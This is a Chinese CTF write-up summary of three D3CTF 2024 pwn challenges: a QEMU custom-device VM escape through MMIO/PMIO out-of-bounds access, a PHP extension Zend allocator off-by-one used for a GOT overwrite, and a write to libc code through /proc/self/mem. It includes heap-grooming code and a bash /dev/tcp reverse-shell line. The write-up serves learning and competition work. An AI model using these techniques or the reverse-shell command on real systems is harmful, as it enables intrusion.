---
title: D3CTF 2024 Writeup - Polaris 战队
contest: D3CTF
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [qemu-vm-escape, mmio-pmio, php-zend-allocator, off-by-one, pwn-2, proc-mem-write]
attack_chain:
  - D3BabyEscape: mmio 设 offset=0x100 越界
  - mmio_read 泄 srandom libc 地址
  - pmio_read(0)==666 触发 write_enable
  - mmio_write(64) 走 rand_r 路径
  - 写入 system + "/sh" 字符串
  - PwnShell: PHP Zend small allocator off-by-one
  - 修改 node->buf 为 GOT 表地址
  - editHacker 改 GOT 为 system
  - bash -c reverse shell
  - write_flag_where: 写 /proc/self/mem 改 libc code
  - 爆破偏移触发 flag 输出
key_payload: QEMU MMIO+PMIO + PHP off-by-one + /proc/self/mem code 改写
one_liner: D3CTF 2024 Polaris 战队 PWN 方向三道高质量 WP：QEMU 客制化设备/PHP 扩展/proc mem 改 libc。
lesson: QEMU 客制化设备的"内容大小越界 + 双接口(MMIO/PMIO)"是 CTF PWN 新热点；PHP Zend 分配器 off-by-one 配合 small bin 错位利用很优雅。
quality: high
---

D3CTF 2024 Polaris 战队第 8 名 PWN 方向三道 WP。

**D3BabyEscape — QEMU 自定义设备 l0dev**

设备结构 0xD50 字节：content 0x100 + offset + srand/rand/rand_r 指针。

- `l0dev_mmio_read(opaque, addr, size)`：先 `rounds_down = addr >> 3`，再做 `8 * rounds_down + size <= 0x100` 检查，但 memcpy 用 `dev->content[dev->offset + addr]`——offset 已被 mmio_write(128, val) 设为 0x100 越界！
- `l0dev_mmio_write(opaque, addr, val, size)`：addr=64 走 rand_r 路径写随机位置；addr=128 设 offset
- `l0dev_pmio_read`：读到 666 时 `++write_enable`，绕过 PMIO write 锁
- `l0dev_pmio_write`：write_enable 开启时写 `dev->content[dev->offset + addr]` 越界

利用链：
1. `mmio_write(128, 0x100)` 把 offset 调大
2. `mmio_read(4)` 读 content[0x100..0x108]（srandom libc 地址）→ 算 libc base
3. `pmio_write(0, 666)` + `pmio_read(0)` 触发 write_enable
4. `mmio_write(64, 0x6873)` 走 rand_r 路径，把 "/sh" 写到 0x102-0x103
5. 调用 `system` 反弹 shell

**PwnShell — PHP 扩展 off-by-one**

zif_addHacker(string arg1, string arg2) 函数：emalloc arg2 长度 + 16 作为 node；emalloc arg1 长度作为 buf；`memcpy(node->arg2_string, arg2->val, arg2->len); node->arg2_string[end_char] = '\0'` 是 off-by-one（len 字节 + 1 字节 NUL）。

漏洞：Zend mm_alloc_small 优先从 `heap->free_slot[bin_num]` 取，bin_data_size 在 64 字节内是 {8, 16, 24, 32, 40, 48, 56, 64} 紧密相连。利用：

```php
addHacker("aaaa...63", "bbbb...47")  // node 1 (size=48+16=64, bin_index=7)
addHacker("aaaa...63", "bbbb...47")  // node 2
addHacker("cccc...63", "dddd...47")  // node 3
removeHacker(0)
addHacker("aaaa...127", "bbbb...47")  // 128 字节 - free_slot[6] 重叠
addHacker("aaaa...63", "bbbb...48")  // off-by-one 改相邻 node buf
```

`editHacker(1, p64($heap_addr+0x1010))` 改 node->buf 为堆地址；displayHacker(3) 读出 _emalloc GOT 项 → 拿 libphp.so 加载地址 + libc base；改 `_emalloc_got` 为 `system`；写 `bash -c 'sh >& /dev/tcp/.../... 0>&1'` 触发反弹 shell。

**write_flag_where — /proc/self/mem 改 libc code**

读 flag 到内存，用户输入 `addr offset`，验证 `libc_code_addr_start <= addr < libc_code_addr_end` 后 `write_mem(addr, flag[offset])` 写 flag 的一个字节到 libc code 段。爆破偏移到能输出 flag 的 gadget（如某 printf 调用前的字符串指针）。

适合作为"现代 Linux 利用技法"入门：QEMU VM Escape + PHP 扩展堆利用 + 自修改代码三条赛道。
